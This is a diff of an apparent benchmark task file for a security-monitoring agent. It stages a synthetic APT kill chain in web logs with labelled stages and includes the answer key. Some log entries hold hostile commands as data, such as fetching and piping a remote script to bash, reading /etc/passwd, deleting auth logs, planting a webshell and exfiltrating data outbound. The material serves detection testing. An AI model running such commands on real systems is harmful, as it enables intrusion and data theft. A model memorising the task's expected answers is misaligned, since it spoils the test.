@@ -1,168 +1,425 @@
 {
   "task_id": "task_hard",
-  "description": "Mixed traffic environment with real attacks, decoys, and false positives",
+  "description": "Full MITRE ATT&CK APT kill chain — 8 stages interleaved with benign noise. Agent must survive the entire chain and block the exfiltration endpoint.",
   "difficulty": "hard",
   "expected_action": "block_ip",
-  "expected_targets": ["45.11.22.33", "104.22.33.44"],
+  "expected_targets": ["198.51.100.14", "203.0.113.42", "10.10.44.3"],
   "decoy_ips": ["10.0.0.5"],
   "friendly_scanner_ips": ["10.200.1.1"],
-  "expected_keywords": ["attack", "malicious", "brute", "force", "injection", "403", "401", "suspicious", "decoy", "false positive", "scanner"],
+  "expected_keywords": [
+    "APT", "kill chain", "reconnaissance", "initial access",
+    "privilege escalation", "exfiltration", "lateral movement",
+    "persistence", "defense evasion", "MITRE", "ATT&CK",
+    "brute force", "credential", "webshell", "C2"
+  ],
   "threat_intel": [
     {
       "source": "AbuseIPDB",
-      "ip": "45.11.22.33",
-      "threat_type": "web_attack",
-      "confidence": 95,
-      "last_seen": "2026-04-10T07:00:00Z"
+      "ip": "198.51.100.14",
+      "threat_type": "apt_recon",
+      "confidence": 92,
+      "last_seen": "2026-04-10T06:00:00Z"
     },
     {
-      "source": "AbuseIPDB",
-      "ip": "104.22.33.44",
-      "threat_type": "brute_force",
+      "source": "CrowdStrike Falcon",
+      "ip": "203.0.113.42",
+      "threat_type": "credential_stuffing",
+      "confidence": 97,
+      "last_seen": "2026-04-10T08:30:00Z"
+    },
+    {
+      "source": "Mandiant",
+      "ip": "203.0.113.42",
+      "threat_type": "apt_group_lazarus",
       "confidence": 88,
-      "last_seen": "2026-04-10T06:30:00Z"
+      "last_seen": "2026-04-09T22:00:00Z"
     }
   ],
   "logs": [
     {
-      "timestamp": "2026-04-10T14:00:01Z",
+      "timestamp": "2026-04-10T13:55:00Z",
       "source_ip": "192.168.1.10",
       "request_path": "/",
       "status_code": 200,
-      "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+      "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+      "attack_stage": "benign",
+      "mitre_technique": null
     },
     {
-      "timestamp": "2026-04-10T14:00:05Z",
+      "timestamp": "2026-04-10T13:55:05Z",
       "source_ip": "192.168.1.20",
       "request_path": "/api/v1/dashboard",
       "status_code": 200,
-      "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
+      "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
+      "attack_stage": "benign",
+      "mitre_technique": null
     },
     {
-      "timestamp": "2026-04-10T14:00:10Z",
-      "source_ip": "45.11.22.33",
-      "request_path": "/admin",
-      "status_code": 403,
-      "user_agent": "curl/7.68.0"
-    },
-    {
-      "timestamp": "2026-04-10T14:00:12Z",
-      "source_ip": "45.11.22.33",
-      "request_path": "/admin/config",
-      "status_code": 403,
-      "user_agent": "curl/7.68.0"
-    },
-    {
-      "timestamp": "2026-04-10T14:00:15Z",
-      "source_ip": "192.168.1.35",
-      "request_path": "/api/v1/products",
-      "status_code": 200,
-      "user_agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
-    },
-    {
-      "timestamp": "2026-04-10T14:00:18Z",
-      "source_ip": "104.22.33.44",
-      "request_path": "/api/v1/login",
-      "status_code": 401,
-      "user_agent": "python-requests/2.28.1"
-    },
-    {
-      "timestamp": "2026-04-10T14:00:20Z",
-      "source_ip": "104.22.33.44",
-      "request_path": "/api/v1/login",
-      "status_code": 401,
-      "user_agent": "python-requests/2.28.1"
-    },
-    {
-      "timestamp": "2026-04-10T14:00:22Z",
+      "timestamp": "2026-04-10T13:55:10Z",
       "source_ip": "10.0.0.5",
       "request_path": "/health",
       "status_code": 200,
-      "user_agent": "InternalMonitor/3.1"
+      "user_agent": "InternalMonitor/3.1",
+      "attack_stage": "benign",
+      "mitre_technique": null
+    },
+
+    {
+      "timestamp": "2026-04-10T14:00:01Z",
+      "source_ip": "198.51.100.14",
+      "request_path": "/",
+      "status_code": 200,
+      "user_agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
+      "attack_stage": "reconnaissance",
+      "mitre_technique": "T1595"
     },
     {
-      "timestamp": "2026-04-10T14:00:25Z",
-      "source_ip": "192.168.1.10",
+      "timestamp": "2026-04-10T14:00:03Z",
+      "source_ip": "198.51.100.14",
+      "request_path": "/robots.txt",
+      "status_code": 200,
+      "user_agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
+      "attack_stage": "reconnaissance",
+      "mitre_technique": "T1595"
+    },
+    {
+      "timestamp": "2026-04-10T14:00:06Z",
+      "source_ip": "198.51.100.14",
+      "request_path": "/.well-known/security.txt",
+      "status_code": 404,
+      "user_agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
+      "attack_stage": "reconnaissance",
+      "mitre_technique": "T1592"
+    },
+    {
+      "timestamp": "2026-04-10T14:00:09Z",
+      "source_ip": "198.51.100.14",
+      "request_path": "/sitemap.xml",
+      "status_code": 200,
+      "user_agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
+      "attack_stage": "reconnaissance",
+      "mitre_technique": "T1595"
+    },
+
+    {
+      "timestamp": "2026-04-10T14:00:12Z",
+      "source_ip": "192.168.1.35",
+      "request_path": "/api/v1/products",
+      "status_code": 200,
+      "user_agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
+      "attack_stage": "benign",
+      "mitre_technique": null
+    },
+
+    {
+      "timestamp": "2026-04-10T14:01:00Z",
+      "source_ip": "203.0.113.42",
+      "request_path": "/api/v1/login",
+      "status_code": 401,
+      "user_agent": "python-requests/2.31.0",
+      "attack_stage": "initial_access",
+      "mitre_technique": "T1078"
+    },
+    {
+      "timestamp": "2026-04-10T14:01:02Z",
+      "source_ip": "203.0.113.42",
+      "request_path": "/api/v1/login",
+      "status_code": 401,
+      "user_agent": "python-requests/2.31.0",
+      "attack_stage": "initial_access",
+      "mitre_technique": "T1078"
+    },
+    {
+      "timestamp": "2026-04-10T14:01:04Z",
+      "source_ip": "203.0.113.42",
+      "request_path": "/api/v1/login",
+      "status_code": 401,
+      "user_agent": "python-requests/2.31.0",
+      "attack_stage": "initial_access",
+      "mitre_technique": "T1078"
+    },
+    {
+      "timestamp": "2026-04-10T14:01:06Z",
+      "source_ip": "203.0.113.42",
+      "request_path": "/api/v1/login",
+      "status_code": 200,
+      "user_agent": "python-requests/2.31.0",
+      "attack_stage": "initial_access",
+      "mitre_technique": "T1078"
+    },
+
+    {
+      "timestamp": "2026-04-10T14:01:10Z",
+      "source_ip": "10.0.0.5",
+      "request_path": "/health",
+      "status_code": 200,
+      "user_agent": "InternalMonitor/3.1",
+      "attack_stage": "benign",
+      "mitre_technique": null
+    },
+    {
+      "timestamp": "2026-04-10T14:01:15Z",
+      "source_ip": "192.168.1.40",
       "request_path": "/api/v1/notifications",
       "status_code": 200,
-      "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+      "user_agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)",
+      "attack_stage": "benign",
+      "mitre_technique": null
+    },
+
+    {
+      "timestamp": "2026-04-10T14:02:00Z",
+      "source_ip": "203.0.113.42",
+      "request_path": "/api/v1/debug/exec?cmd=whoami",
+      "status_code": 200,
+      "user_agent": "python-requests/2.31.0",
+      "attack_stage": "execution",
+      "mitre_technique": "T1059.001"
     },
     {
-      "timestamp": "2026-04-10T14:00:28Z",
+      "timestamp": "2026-04-10T14:02:05Z",
+      "source_ip": "203.0.113.42",
+      "request_path": "/api/v1/debug/exec?cmd=cat+/etc/passwd",
+      "status_code": 200,
+      "user_agent": "python-requests/2.31.0",
+      "attack_stage": "execution",
+      "mitre_technique": "T1059.001"
+    },
+
+    {
+      "timestamp": "2026-04-10T14:02:08Z",
+      "source_ip": "192.168.1.10",
+      "request_path": "/api/v1/settings",
+      "status_code": 200,
+      "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+      "attack_stage": "benign",
+      "mitre_technique": null
+    },
+
+    {
+      "timestamp": "2026-04-10T14:03:00Z",
+      "source_ip": "203.0.113.42",
+      "request_path": "/api/v1/upload",
+      "status_code": 201,
+      "user_agent": "python-requests/2.31.0",
+      "attack_stage": "persistence",
+      "mitre_technique": "T1505.003"
+    },
+    {
+      "timestamp": "2026-04-10T14:03:10Z",
+      "source_ip": "203.0.113.42",
+      "request_path": "/uploads/.hidden/shell.php",
+      "status_code": 200,
+      "user_agent": "python-requests/2.31.0",
+      "attack_stage": "persistence",
+      "mitre_technique": "T1505.003"
+    },
+    {
+      "timestamp": "2026-04-10T14:03:20Z",
+      "source_ip": "203.0.113.42",
+      "request_path": "/api/v1/admin/users?action=create&user=svc_backup&role=admin",
+      "status_code": 201,
+      "user_agent": "python-requests/2.31.0",
+      "attack_stage": "persistence",
+      "mitre_technique": "T1136.001"
+    },
+
+    {
+      "timestamp": "2026-04-10T14:03:25Z",
       "source_ip": "10.200.1.1",
       "request_path": "/api/v1/debug",
       "status_code": 404,
-      "user_agent": "Nessus/10.4.1"
+      "user_agent": "Nessus/10.4.1",
+      "attack_stage": "benign",
+      "mitre_technique": null
     },
     {
-      "timestamp": "2026-04-10T14:00:30Z",
+      "timestamp": "2026-04-10T14:03:28Z",
       "source_ip": "10.200.1.1",
       "request_path": "/.env",
       "status_code": 404,
-      "user_agent": "Nessus/10.4.1"
+      "user_agent": "Nessus/10.4.1",
+      "attack_stage": "benign",
+      "mitre_technique": null
     },
+
     {
-      "timestamp": "2026-04-10T14:00:33Z",
-      "source_ip": "192.168.1.40",
-      "request_path": "/images/hero.png",
+      "timestamp": "2026-04-10T14:04:00Z",
+      "source_ip": "203.0.113.42",
+      "request_path": "/api/v1/debug/exec?cmd=curl+http://198.51.100.14/privesc.sh|bash",
       "status_code": 200,
-      "user_agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)"
+      "user_agent": "python-requests/2.31.0",
+      "attack_stage": "privilege_escalation",
+      "mitre_technique": "T1068"
     },
     {
-      "timestamp": "2026-04-10T14:00:35Z",
-      "source_ip": "45.11.22.33",
-      "request_path": "/wp-admin",
-      "status_code": 403,
-      "user_agent": "curl/7.68.0"
+      "timestamp": "2026-04-10T14:04:05Z",
+      "source_ip": "203.0.113.42",
+      "request_path": "/api/v1/debug/exec?cmd=id",
+      "status_code": 200,
+      "user_agent": "python-requests/2.31.0",
+      "attack_stage": "privilege_escalation",
+      "mitre_technique": "T1068"
     },
+
     {
-      "timestamp": "2026-04-10T14:00:38Z",
+      "timestamp": "2026-04-10T14:04:10Z",
       "source_ip": "192.168.1.20",
-      "request_path": "/api/v1/settings",
+      "request_path": "/api/v1/reports",
       "status_code": 200,
-      "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
+      "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
+      "attack_stage": "benign",
+      "mitre_technique": null
     },
     {
-      "timestamp": "2026-04-10T14:00:40Z",
-      "source_ip": "104.22.33.44",
-      "request_path": "/api/v1/login",
-      "status_code": 401,
-      "user_agent": "python-requests/2.28.1"
-    },
-    {
-      "timestamp": "2026-04-10T14:00:42Z",
-      "source_ip": "192.168.1.50",
-      "request_path": "/static/css/style.css",
-      "status_code": 200,
-      "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
-    },
-    {
-      "timestamp": "2026-04-10T14:00:45Z",
-      "source_ip": "10.0.0.5",
-      "request_path": "/metrics",
-      "status_code": 200,
-      "user_agent": "InternalMonitor/3.1"
-    },
-    {
-      "timestamp": "2026-04-10T14:00:48Z",
+      "timestamp": "2026-04-10T14:04:15Z",
       "source_ip": "192.168.1.35",
       "request_path": "/api/v1/cart",
       "status_code": 200,
-      "user_agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+      "user_agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
+      "attack_stage": "benign",
+      "mitre_technique": null
+    },
+
+    {
+      "timestamp": "2026-04-10T14:05:00Z",
+      "source_ip": "203.0.113.42",
+      "request_path": "/api/v1/debug/exec?cmd=rm+-rf+/var/log/auth.log",
+      "status_code": 200,
+      "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+      "attack_stage": "defense_evasion",
+      "mitre_technique": "T1070.004"
     },
     {
-      "timestamp": "2026-04-10T14:00:50Z",
+      "timestamp": "2026-04-10T14:05:05Z",
+      "source_ip": "203.0.113.42",
+      "request_path": "/api/v1/debug/exec?cmd=history+-c",
+      "status_code": 200,
+      "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+      "attack_stage": "defense_evasion",
+      "mitre_technique": "T1070.003"
+    },
+    {
+      "timestamp": "2026-04-10T14:05:10Z",
+      "source_ip": "10.10.44.3",
+      "request_path": "/api/v1/admin/config",
+      "status_code": 200,
+      "user_agent": "InternalMonitor/3.1",
+      "attack_stage": "defense_evasion",
+      "mitre_technique": "T1036"
+    },
+
+    {
+      "timestamp": "2026-04-10T14:05:15Z",
+      "source_ip": "10.0.0.5",
+      "request_path": "/metrics",
+      "status_code": 200,
+      "user_agent": "InternalMonitor/3.1",
+      "attack_stage": "benign",
+      "mitre_technique": null
+    },
+
+    {
+      "timestamp": "2026-04-10T14:06:00Z",
+      "source_ip": "10.10.44.3",
+      "request_path": "/api/v1/admin/users?export=csv",
+      "status_code": 200,
+      "user_agent": "InternalMonitor/3.1",
+      "attack_stage": "collection",
+      "mitre_technique": "T1005"
+    },
+    {
+      "timestamp": "2026-04-10T14:06:05Z",
+      "source_ip": "10.10.44.3",
+      "request_path": "/api/v1/admin/database/dump?tables=credentials,sessions",
+      "status_code": 200,
+      "user_agent": "InternalMonitor/3.1",
+      "attack_stage": "collection",
+      "mitre_technique": "T1005"
+    },
+    {
+      "timestamp": "2026-04-10T14:06:10Z",
+      "source_ip": "10.10.44.3",
+      "request_path": "/api/v1/admin/config?show=secrets",
+      "status_code": 200,
+      "user_agent": "InternalMonitor/3.1",
+      "attack_stage": "collection",
+      "mitre_technique": "T1005"
+    },
+
+    {
+      "timestamp": "2026-04-10T14:06:15Z",
       "source_ip": "192.168.1.10",
       "request_path": "/favicon.ico",
       "status_code": 200,
-      "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+      "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+      "attack_stage": "benign",
+      "mitre_technique": null
     },
     {
-      "timestamp": "2026-04-10T14:00:55Z",
+      "timestamp": "2026-04-10T14:06:20Z",
       "source_ip": "192.168.1.40",
       "request_path": "/api/v1/health",
       "status_code": 200,
-      "user_agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)"
+      "user_agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)",
+      "attack_stage": "benign",
+      "mitre_technique": null
+    },
+
+    {
+      "timestamp": "2026-04-10T14:07:00Z",
+      "source_ip": "10.10.44.3",
+      "request_path": "/api/v1/webhook/outbound?dest=198.51.100.250&size=14MB",
+      "status_code": 200,
+      "user_agent": "curl/7.88.1",
+      "attack_stage": "exfiltration",
+      "mitre_technique": "T1041"
+    },
+    {
+      "timestamp": "2026-04-10T14:07:05Z",
+      "source_ip": "10.10.44.3",
+      "request_path": "/api/v1/webhook/outbound?dest=198.51.100.250&size=8MB",
+      "status_code": 200,
+      "user_agent": "curl/7.88.1",
+      "attack_stage": "exfiltration",
+      "mitre_technique": "T1041"
+    },
+    {
+      "timestamp": "2026-04-10T14:07:10Z",
+      "source_ip": "10.10.44.3",
+      "request_path": "/api/v1/webhook/outbound?dest=198.51.100.250&size=3MB&final=true",
+      "status_code": 200,
+      "user_agent": "curl/7.88.1",
+      "attack_stage": "exfiltration",
+      "mitre_technique": "T1041"
+    },
+
+    {
+      "timestamp": "2026-04-10T14:07:30Z",
+      "source_ip": "192.168.1.20",
+      "request_path": "/api/v1/settings",
+      "status_code": 200,
+      "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
+      "attack_stage": "benign",
+      "mitre_technique": null
+    },
+    {
+      "timestamp": "2026-04-10T14:07:35Z",
+      "source_ip": "192.168.1.35",
+      "request_path": "/api/v1/products",
+      "status_code": 200,
+      "user_agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
+      "attack_stage": "benign",
+      "mitre_technique": null
+    },
+    {
+      "timestamp": "2026-04-10T14:07:40Z",
+      "source_ip": "10.0.0.5",
+      "request_path": "/health",
+      "status_code": 200,
+      "user_agent": "InternalMonitor/3.1",
+      "attack_stage": "benign",
+      "mitre_technique": null
     }
   ]
 }
